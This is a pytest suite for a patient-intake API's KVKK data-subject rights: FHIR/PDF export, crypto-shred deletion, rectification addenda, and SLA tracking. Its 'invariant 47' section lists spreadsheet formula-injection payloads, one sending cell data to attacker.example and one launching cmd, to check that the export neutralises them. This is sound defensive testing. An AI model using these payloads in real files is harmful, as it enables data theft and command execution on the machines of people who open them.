"""INT-037 — data-subject rights: export (FHIR+PDF), delete (crypto-shred with
the 30-day grace), rectify, and the KVKK m.13 SLA tracker.

Legal frame: files/06 §1 KVKK-11/13 ("access/rectify/delete/port; respond
≤ 30 days"), files/06 §2.3 (withdrawal after the fact cancels live shares),
files/06 §3 (30-day grace, then crypto-shred), files/10 §4(b) + inv. 47
(export-injection guard), sec_row ``dsar``.

Two things this suite deliberately does NOT do. It never writes real Turkish
legal copy — the fixed strings are INT-210's human deliverable, so the
fixtures are synthetic and the tests assert the BINDING, not the wording. And
it pins the fail-closed direction first: with ``docs/legal/strings.yaml``
absent (today's state) the export refuses while the SLA clock still runs,
because a request we cannot answer is an obligation we still owe.
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
import sys
import uuid
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "api"))

from api_harness import (  # noqa: E402
    ADMIN_TOKEN,
    PATIENT_TOKEN,
    ApiHarness,
    build_harness,
    run,
)
from intake_api.consent_guard import (  # noqa: E402
    data_subject_right_routes,
    unguarded_data_routes,
)
from intake_api.db import tenant_session  # noqa: E402
from intake_api.dev_fixture import DEV_PATIENT_ID, DEV_TENANT_ID  # noqa: E402
from intake_api.dsar.document import render_export_document  # noqa: E402
from intake_api.dsar.export import ExportView, build_export_bundle  # noqa: E402
from intake_api.dsar.shred import execute_due_shreds  # noqa: E402
from intake_api.dsar.sla import KVKK_RESPONSE_WINDOW, SHRED_GRACE, overdue_requests  # noqa: E402
from intake_api.dsar.strings import DSAR_EXPORT_STRING_KEYS  # noqa: E402
from intake_platform.db.envelope_json import encrypted_field_from_json  # noqa: E402
from intake_platform.db.models import (  # noqa: E402
    Document,
    DsarRequest,
    IntakeSession,
    Note,
    Share,
    Slot,
)
from intake_platform.envelope import CryptoShredError  # noqa: E402
from intake_platform.legal import LegalStringsCatalog  # noqa: E402
from legal_harness import BOUND_SCOPES, grant_bound, write_all_consent_texts  # noqa: E402
from sqlalchemy import select  # noqa: E402
from sqlalchemy.ext.asyncio import AsyncSession  # noqa: E402

# --- synthetic fixtures -------------------------------------------------------------

#: Synthetic stand-in copy. Real strings are authored by counsel into
#: docs/legal/strings.yaml (INT-210); these exist only to exercise binding.
FIXTURE_STRINGS_VERSION = "int037-test-fixture.1"


def write_legal_strings(
    root: Path, *, version: str = FIXTURE_STRINGS_VERSION, suffix: str = ""
) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    path = root / "strings.yaml"
    body = [f"---\nlegal_strings_version: {version}\n---"]
    for key in DSAR_EXPORT_STRING_KEYS:
        body.append(f'{key}: "sentetik fikstur {key}{suffix}"')
    path.write_text("\n".join(body) + "\n", encoding="utf-8")
    return path


NOTE_BODY: dict[str, Any] = {
    "sections": [
        {"id": "chief_complaint", "title": "Şikâyet", "lines": ["Göğüs ağrısı üç gündür"]},
        {"id": "hpi", "title": "Öykü", "lines": ["Ağrı sabah başladı", "Nefes darlığı yok"]},
    ],
    "scopes": {"chief_complaint": True, "hpi": True},
}


@pytest.fixture()
def strings_path(tmp_path: Path) -> Path:
    return write_legal_strings(tmp_path / "legal")


@pytest.fixture()
def unbound_dsar(tmp_path: Path) -> Iterator[ApiHarness]:
    """Today's world: consent texts bound, docs/legal/strings.yaml ABSENT."""
    for built in build_harness(
        tmp_path,
        token_patient=PATIENT_TOKEN,
        token_admin=ADMIN_TOKEN,
        legal_root=write_all_consent_texts(tmp_path / "legal" / "consents"),
        legal_strings=tmp_path / "legal" / "strings-not-authored.yaml",
    ):
        grant_bound(built, *BOUND_SCOPES)
        yield built


@pytest.fixture()
def dsar(tmp_path: Path, strings_path: Path) -> Iterator[ApiHarness]:
    """The post-INT-210 world in miniature: bound consent texts AND a bound
    (synthetic) strings.yaml, so the export renders end to end."""
    for built in build_harness(
        tmp_path,
        token_patient=PATIENT_TOKEN,
        token_admin=ADMIN_TOKEN,
        legal_root=write_all_consent_texts(tmp_path / "legal" / "consents"),
        legal_strings=strings_path,
    ):
        grant_bound(built, *BOUND_SCOPES)
        yield built


def seed_visit_with_sent_note(
    harness: ApiHarness, *, note: dict[str, Any] | None = None
) -> tuple[str, dict[str, Any]]:
    """A visit, a note, and a live share — the shape a DSAR request meets."""
    created = harness.client.post(
        "/v1/visits",
        headers=harness.patient(),
        json={"hospital": "Acıbadem Maslak", "department": "Kardiyoloji", "date": "2026-09-10"},
    )
    assert created.status_code == 201, created.text
    visit_id = str(created.json()["id"])
    body = dict(note or NOTE_BODY)
    put = harness.client.put(
        f"/v1/visits/{visit_id}/note",
        headers=harness.patient(),
        json={**body, "status": "sent"},
    )
    assert put.status_code == 200, put.text
    return visit_id, body


def request_export(harness: ApiHarness) -> str:
    created = harness.client.post("/v1/me/dsar/export", headers=harness.patient())
    assert created.status_code == 201, created.text
    request_id: str = created.json()["request_id"]
    return request_id


def rows(harness: ApiHarness, model: Any) -> list[Any]:
    async def _load() -> list[Any]:
        async with AsyncSession(harness.engine) as session:
            return list((await session.scalars(select(model))).all())

    loaded: list[Any] = run(_load())
    return loaded


# --- route declaration (the scan must stay empty) -----------------------------------


def test_every_dsar_route_declares_its_lawful_basis(dsar: ApiHarness) -> None:
    app = dsar.client.app
    assert unguarded_data_routes(app) == []  # type: ignore[arg-type]
    assert data_subject_right_routes(app) == [  # type: ignore[arg-type]
        "DELETE /v1/me/dsar/delete/{request_id}",
        "GET /v1/me/dsar/export/{request_id}",
        "GET /v1/me/dsar/requests",
        "POST /v1/me/dsar/delete",
        "POST /v1/me/dsar/export",
        "POST /v1/me/dsar/rectify",
    ]


def test_the_statutory_marker_is_caged_to_the_dsar_prefix(dsar: ApiHarness) -> None:
    """A marker that could be borrowed elsewhere would be a hole in the scan."""
    for route in data_subject_right_routes(dsar.client.app):  # type: ignore[arg-type]
        assert route.split(" ", 1)[1].startswith("/v1/me/dsar")


def test_rights_survive_the_withdrawal_of_every_consent(dsar: ApiHarness) -> None:
    """KVKK m.11 is a statutory right, not a consented purpose: a patient who
    has withdrawn core consent must still be able to see and erase their data
    — a route that 403s here could never answer the request that withdrawal
    itself provokes (files/06 §2.3)."""
    seed_visit_with_sent_note(dsar)
    for scope in BOUND_SCOPES:
        dsar.revoke_consent(scope)
    assert dsar.client.post("/v1/visits", headers=dsar.patient(), json={}).status_code in (403, 422)
    request_id = request_export(dsar)
    assert dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).status_code
    assert dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient()).status_code == 201


def test_a_non_subject_principal_has_no_dsar_surface(dsar: ApiHarness) -> None:
    """The clinic admin is not the data subject; DSAR is the subject's own."""
    for method, path in (
        ("post", "/v1/me/dsar/export"),
        ("post", "/v1/me/dsar/delete"),
        ("get", "/v1/me/dsar/requests"),
    ):
        response = getattr(dsar.client, method)(path, headers=dsar.admin())
        assert response.status_code == 403, f"{method} {path}: {response.text}"


# --- export -------------------------------------------------------------------------


def test_export_fails_closed_while_the_legal_strings_are_unauthored(
    unbound_dsar: ApiHarness,
) -> None:
    """HUMAN_BLOCKERS rule 2: build the mechanism, wire the gate, fail closed.
    The clock still starts — the obligation exists whether or not we can
    render the answer."""
    seed_visit_with_sent_note(unbound_dsar)
    request_id = request_export(unbound_dsar)
    fetched = unbound_dsar.client.get(
        f"/v1/me/dsar/export/{request_id}", headers=unbound_dsar.patient()
    )
    assert fetched.status_code == 503
    assert fetched.json() == {"error": "legal_strings_missing"}
    tracked = unbound_dsar.client.get("/v1/me/dsar/requests", headers=unbound_dsar.patient())
    assert tracked.json()[0]["status"] == "received"
    assert tracked.json()[0]["completed_at"] is None


def test_export_bundles_fhir_and_pdf(dsar: ApiHarness, strings_path: Path) -> None:
    visit_id, body = seed_visit_with_sent_note(dsar)
    request_id = request_export(dsar)
    payload = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()

    assert payload["legal_strings_hash"] == hashlib.sha256(strings_path.read_bytes()).hexdigest()
    assert payload["legal_strings_version"] == FIXTURE_STRINGS_VERSION

    bundle = payload["fhir_bundle"]
    assert bundle["resourceType"] == "Bundle"
    assert bundle["type"] == "collection"
    kinds = [entry["resource"]["resourceType"] for entry in bundle["entry"]]
    assert kinds.count("Patient") == 1
    assert "QuestionnaireResponse" in kinds  # the visit's stored slots
    assert "Composition" in kinds  # the pre-visit note
    flat = json.dumps(bundle, ensure_ascii=False)
    assert visit_id in flat
    assert body["sections"][0]["lines"][0] in flat

    pdf = payload["pdf"]
    assert pdf["media_type"] == "application/pdf"
    raw = base64.b64decode(pdf["base64"])
    assert raw.startswith(b"%PDF-")
    assert hashlib.sha256(raw).hexdigest() == pdf["sha256"]


def test_export_marks_the_request_answered_and_stops_the_clock(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    request_id = request_export(dsar)
    dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient())
    tracked = dsar.client.get("/v1/me/dsar/requests", headers=dsar.patient()).json()[0]
    assert tracked["status"] == "completed"
    assert tracked["completed_at"] is not None
    assert tracked["overdue"] is False


def test_export_refuses_once_the_bound_strings_have_moved(
    dsar: ApiHarness, strings_path: Path
) -> None:
    """Same contract as the consent texts: a document issued against copy that
    has since changed is not the document we issued — refuse, re-issue."""
    seed_visit_with_sent_note(dsar)
    request_id = request_export(dsar)
    assert (
        dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).status_code
        == 200
    )
    write_legal_strings(strings_path.parent, version="int037-test-fixture.2", suffix=" revize")
    again = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient())
    assert again.status_code == 409
    assert again.json() == {"error": "legal_strings_changed"}


def test_the_renderers_are_deterministic_for_a_given_view(strings_path: Path) -> None:
    """Same record, same instant, same bytes — so an export's SHA-256 is a
    stable receipt rather than a value that moves on every render."""
    strings = LegalStringsCatalog(strings_path).entry(required=DSAR_EXPORT_STRING_KEYS)
    view = ExportView(
        patient_id=DEV_PATIENT_ID,
        generated_at=datetime(2026, 9, 10, 8, 30, tzinfo=UTC),
        visits=(),
        notes=(),
        section_lines={"consents": ("core · v1 · text_hash:abc",)},
    )
    assert build_export_bundle(view, strings=strings) == build_export_bundle(view, strings=strings)
    assert (
        render_export_document(view, strings=strings).pdf
        == render_export_document(view, strings=strings).pdf
    )


def test_re_issuing_an_export_keeps_its_instant_and_its_binding(dsar: ApiHarness) -> None:
    """A data subject may download twice. The document's instant is the
    request's own ``received_at`` and its binding is the strings hash it was
    issued under, so neither drifts under them — while the content honestly
    reflects the record as it now stands (the first issue closed this very
    request, and the export lists the subject's requests)."""
    seed_visit_with_sent_note(dsar)
    request_id = request_export(dsar)
    one = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    two = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    assert one["generated_at"] == two["generated_at"]
    assert one["legal_strings_hash"] == two["legal_strings_hash"]


def test_export_carries_only_the_requesting_subject(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    other = uuid.uuid4()
    request_id = request_export(dsar)
    payload = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    flat = json.dumps(payload["fhir_bundle"])
    assert str(DEV_PATIENT_ID) in flat
    assert str(other) not in flat


def test_another_subjects_request_id_is_not_readable(dsar: ApiHarness) -> None:
    assert (
        dsar.client.get(f"/v1/me/dsar/export/{uuid.uuid4()}", headers=dsar.patient()).status_code
        == 404
    )


# --- invariant 47: export_injection_guard -------------------------------------------

FORMULA_PAYLOADS = (
    '=HYPERLINK("https://attacker.example/?d="&A1,"tikla")',
    "+1+1",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd",
    "\t=1+1",
)


def test_export_injection_guard_neutralises_every_formula_lead(dsar: ApiHarness) -> None:
    """files/10 inv. 47 / files/08 §0c F13: the attacker writes the content,
    a compliance officer opens the export, and KVKK m.13 obliges us to produce
    it. No exported cell may begin with a character a spreadsheet evaluates."""
    seed_visit_with_sent_note(
        dsar,
        note={
            "sections": [
                {
                    "id": "chief_complaint",
                    "title": "Şikâyet",
                    "lines": list(FORMULA_PAYLOADS),
                }
            ],
            "scopes": {"chief_complaint": True},
        },
    )
    request_id = request_export(dsar)
    payload = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    cells = re.findall(r'"([^"]*)"', json.dumps(payload["fhir_bundle"], ensure_ascii=False))
    offenders = [cell for cell in cells if cell[:1] in {"=", "+", "-", "@", "\t", "\r"}]
    assert offenders == [], offenders
    assert "'=HYPERLINK" in json.dumps(payload["fhir_bundle"], ensure_ascii=False)


def test_export_injection_guard_strips_control_characters_and_crlf(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(
        dsar,
        note={
            "sections": [
                {
                    "id": "hpi",
                    "title": "Öykü",
                    "lines": ["bir\r\niki", "üç\x07dört", "beş\x00altı"],
                }
            ],
            "scopes": {"hpi": True},
        },
    )
    request_id = request_export(dsar)
    payload = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    flat = json.dumps(payload["fhir_bundle"], ensure_ascii=False)
    assert not any(ch in flat for ch in ("\r", "\x07", "\x00"))
    # the content itself survives — the guard neutralises, it does not delete
    assert "iki" in flat and "dört" in flat


# --- delete -------------------------------------------------------------------------


def test_delete_schedules_the_shred_and_cancels_live_shares(dsar: ApiHarness) -> None:
    """files/06 §2.3: a deletion cancels the shares rather than orphaning
    them; files/06 §3: 30-day grace, then crypto-shred."""
    seed_visit_with_sent_note(dsar)
    assert [share.revoked_at for share in rows(dsar, Share)] == [None]

    created = dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    assert created.status_code == 201, created.text
    body = created.json()
    assert body["status"] == "scheduled"
    assert body["shares_cancelled"] == 1
    received = datetime.fromisoformat(body["received_at"])
    assert datetime.fromisoformat(body["grace_ends_at"]) - received == SHRED_GRACE
    assert datetime.fromisoformat(body["due_at"]) - received == KVKK_RESPONSE_WINDOW

    assert all(share.revoked_at is not None for share in rows(dsar, Share))
    # scheduling is not destruction: the record is still there during the grace
    assert rows(dsar, Note) and rows(dsar, IntakeSession)


def test_a_scheduled_delete_can_be_withdrawn_inside_the_grace(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    request_id = dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient()).json()["request_id"]
    cancelled = dsar.client.delete(f"/v1/me/dsar/delete/{request_id}", headers=dsar.patient())
    assert cancelled.status_code == 200
    assert cancelled.json()["status"] == "cancelled"
    # the share stays revoked: un-sharing cannot be undone by the server, the
    # patient re-sends. Silently re-publishing to a clinic would be worse.
    assert all(share.revoked_at is not None for share in rows(dsar, Share))
    assert run(_execute(dsar, at=datetime.now(UTC) + SHRED_GRACE * 2)).shredded_requests == 0


def _remover(harness: ApiHarness) -> Any:
    """MinIO's remove_object is idempotent for an absent key; the unit-lane
    fake raises. An object that is already gone is a completed erasure, so the
    seam matches the real client rather than the stricter fake."""

    def remove(object_ref: str) -> None:
        bucket, _, key = object_ref.partition("/")
        harness.storage.buckets.get(bucket, {}).pop(key, None)
        removed.append(object_ref)

    removed: list[str] = []
    remove.removed = removed  # type: ignore[attr-defined]
    return remove


async def _execute(harness: ApiHarness, *, at: datetime, remove: Any = None) -> Any:
    return await execute_due_shreds(
        harness.engine,
        tenant_id=DEV_TENANT_ID,
        audit=harness.client.app.state.api.audit,  # type: ignore[attr-defined]
        remove_object=remove if remove is not None else _remover(harness),
        now=at,
    )


def test_the_shred_executor_waits_out_the_grace(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    report = run(_execute(dsar, at=datetime.now(UTC) + SHRED_GRACE - timedelta(hours=1)))
    assert report.shredded_requests == 0
    assert rows(dsar, Note)


def test_the_shred_executor_crypto_shreds_then_removes_the_rows(dsar: ApiHarness) -> None:
    visit_id, _ = seed_visit_with_sent_note(dsar)
    upload = dsar.client.post(
        f"/v1/visits/{visit_id}/documents",
        headers=dsar.patient(),
        json={"content_type": "application/pdf", "sha256": "ab" * 32},
    )
    assert upload.status_code == 201, upload.text
    assert rows(dsar, Document)

    payload_before = dict(rows(dsar, Note)[0].payload)
    object_refs = [row.object_ref for row in rows(dsar, Document)]
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    remove = _remover(dsar)
    report = run(
        _execute(dsar, at=datetime.now(UTC) + SHRED_GRACE + timedelta(minutes=1), remove=remove)
    )

    assert remove.removed == object_refs  # the object store is swept, not orphaned
    assert report.shredded_requests == 1
    assert report.shredded_fields >= 1
    # crypto-shred: the ciphertext's only key is gone, so the bytes captured
    # before the run can never be opened again
    field = encrypted_field_from_json(payload_before)
    with pytest.raises(CryptoShredError):
        dsar.cipher.decrypt_field(str(DEV_TENANT_ID), _shredded_like(field))
    assert rows(dsar, Note) == []
    assert rows(dsar, Slot) == []
    assert rows(dsar, Share) == []
    assert rows(dsar, Document) == []
    assert rows(dsar, IntakeSession) == []


def _shredded_like(field: Any) -> Any:
    from intake_platform.envelope import shred_field

    return shred_field(field)


def test_the_erasure_keeps_the_records_statute_says_to_keep(dsar: ApiHarness) -> None:
    """files/06 §3 keeps consent and audit records for 10 years and
    DEST-2017 keeps destruction records for ≥ 3 years — and the DSAR request
    row IS that destruction record. Statutory retention outranks erasure, and
    a tracker that erased its own evidence of having erased would fail the
    audit it exists for. All three hold ids and clocks only."""
    from intake_platform.db.models import Consent, Patient

    seed_visit_with_sent_note(dsar)
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    run(_execute(dsar, at=datetime.now(UTC) + SHRED_GRACE + timedelta(minutes=1)))

    assert rows(dsar, Consent), "consent records are 10-year audit evidence (06 §3)"
    assert rows(dsar, DsarRequest), "the request row is the DEST-2017 destruction record"
    assert rows(dsar, Patient), "the pseudonym row anchors the retained evidence"
    assert rows(dsar, Note) == [] and rows(dsar, Slot) == []


def test_the_shred_run_closes_the_request_and_lands_in_the_audit_chain(
    dsar: ApiHarness,
) -> None:
    seed_visit_with_sent_note(dsar)
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    run(_execute(dsar, at=datetime.now(UTC) + SHRED_GRACE + timedelta(minutes=1)))
    entries = dsar.audit_store.entries()
    actions = [entry.action for entry in entries]
    assert "dsar.delete.request" in actions
    assert "dsar.delete.shred" in actions
    shred = [entry for entry in entries if entry.action == "dsar.delete.shred"][-1]
    assert shred.consent_scope_ref == "basis:KVKK-11/13"
    assert shred.resource_ref.startswith("dsar-request:")
    request_row = rows(dsar, DsarRequest)[0]
    assert request_row.status.value == "completed"


def test_no_dsar_audit_entry_carries_free_text(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    request_export(dsar)
    shaped = re.compile(r"[A-Za-z0-9._:/@-]{1,128}")
    for entry in dsar.audit_store.entries():
        if not entry.action.startswith("dsar."):
            continue
        for value in (entry.actor, entry.action, entry.resource_ref, entry.consent_scope_ref):
            assert shaped.fullmatch(value), value


# --- rectify ------------------------------------------------------------------------


def test_rectification_writes_an_addendum_and_never_rewrites_the_note(
    dsar: ApiHarness,
) -> None:
    """files/02 §3 / KVKK m.11 + KSVY m.13: correction produces an addendum,
    not a silent rewrite — the record of what was actually said stands."""
    visit_id, _ = seed_visit_with_sent_note(dsar)
    note_id = str(rows(dsar, Note)[0].id)
    before = dict(rows(dsar, Note)[0].payload)

    created = dsar.client.post(
        "/v1/me/dsar/rectify",
        headers=dsar.patient(),
        json={"target_ref": f"note:{note_id}", "correction": "Ağrı iki gündür, üç değil."},
    )
    assert created.status_code == 201, created.text
    assert created.json()["target_ref"] == f"note:{note_id}"
    assert dict(rows(dsar, Note)[0].payload) == before

    actions = [entry.action for entry in dsar.audit_store.entries()]
    assert "dsar.rectify" in actions

    request_id = request_export(dsar)
    payload = dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient()).json()
    assert "Ağrı iki gündür" in json.dumps(payload["fhir_bundle"], ensure_ascii=False)
    assert visit_id


def test_the_addendum_is_encrypted_at_rest(dsar: ApiHarness) -> None:
    from intake_platform.db.models import DsarRectification

    seed_visit_with_sent_note(dsar)
    note_id = str(rows(dsar, Note)[0].id)
    dsar.client.post(
        "/v1/me/dsar/rectify",
        headers=dsar.patient(),
        json={"target_ref": f"note:{note_id}", "correction": "gizli düzeltme metni"},
    )
    stored = rows(dsar, DsarRectification)[0]
    assert "gizli düzeltme metni" not in json.dumps(dict(stored.payload))
    field = encrypted_field_from_json(dict(stored.payload))
    assert b"gizli" in dsar.cipher.decrypt_field(str(DEV_TENANT_ID), field)


@pytest.mark.parametrize(
    "target_ref",
    ["Ağrı hakkında", "note:not-a-uuid", "secret:" + "x" * 200, "", "patients name"],
)
def test_rectification_refuses_a_target_that_is_not_id_shaped(
    dsar: ApiHarness, target_ref: str
) -> None:
    """The target is a reference, so it can be validated; free text there
    would put PHI into a column the audit and the tracker both read."""
    response = dsar.client.post(
        "/v1/me/dsar/rectify",
        headers=dsar.patient(),
        json={"target_ref": target_ref, "correction": "düzeltme"},
    )
    assert response.status_code == 422, response.text


def test_rectification_refuses_a_target_that_is_not_the_subjects(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    response = dsar.client.post(
        "/v1/me/dsar/rectify",
        headers=dsar.patient(),
        json={"target_ref": f"note:{uuid.uuid4()}", "correction": "düzeltme"},
    )
    assert response.status_code == 404


# --- the KVKK m.13 SLA tracker ------------------------------------------------------


def test_the_window_is_the_statute_and_nothing_invented(dsar: ApiHarness) -> None:
    assert KVKK_RESPONSE_WINDOW == timedelta(days=30)  # files/06 §1 KVKK-11/13
    assert SHRED_GRACE == timedelta(days=30)  # files/06 §3


def test_tracker_rows_carry_ids_and_clocks_only(dsar: ApiHarness) -> None:
    """Invariant 6: the SLA queue is read by operations staff, so a row may
    hold ids, an enumerated kind/status and timestamps — never content."""
    seed_visit_with_sent_note(dsar)
    request_export(dsar)
    dsar.client.post("/v1/me/dsar/delete", headers=dsar.patient())
    for row in rows(dsar, DsarRequest):
        assert set(DsarRequest.__table__.columns.keys()) == {
            "id",
            "tenant_id",
            "patient_id",
            "kind",
            "status",
            "received_at",
            "due_at",
            "grace_ends_at",
            "completed_at",
            # a hash of a public legal file, the consents.text_hash precedent
            "legal_strings_hash",
        }
        assert row.kind.value in {"export", "delete", "rectify"}
        assert row.due_at is not None


def test_the_tracker_lists_requests_past_the_thirty_day_window(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    request_export(dsar)

    async def _overdue(at: datetime) -> list[uuid.UUID]:
        async with tenant_session(dsar.engine, DEV_TENANT_ID) as session:
            return [
                row.id for row in await overdue_requests(session, tenant_id=DEV_TENANT_ID, now=at)
            ]

    assert run(_overdue(datetime.now(UTC))) == []
    late = run(_overdue(datetime.now(UTC) + KVKK_RESPONSE_WINDOW + timedelta(minutes=1)))
    assert len(late) == 1
    listed = dsar.client.get("/v1/me/dsar/requests", headers=dsar.patient()).json()
    assert listed[0]["due_at"] is not None
    assert listed[0]["overdue"] is False


def test_a_completed_request_is_never_overdue(dsar: ApiHarness) -> None:
    seed_visit_with_sent_note(dsar)
    request_id = request_export(dsar)
    dsar.client.get(f"/v1/me/dsar/export/{request_id}", headers=dsar.patient())

    async def _overdue(at: datetime) -> list[uuid.UUID]:
        async with tenant_session(dsar.engine, DEV_TENANT_ID) as session:
            return [
                row.id for row in await overdue_requests(session, tenant_id=DEV_TENANT_ID, now=at)
            ]

    assert run(_overdue(datetime.now(UTC) + KVKK_RESPONSE_WINDOW * 2)) == []
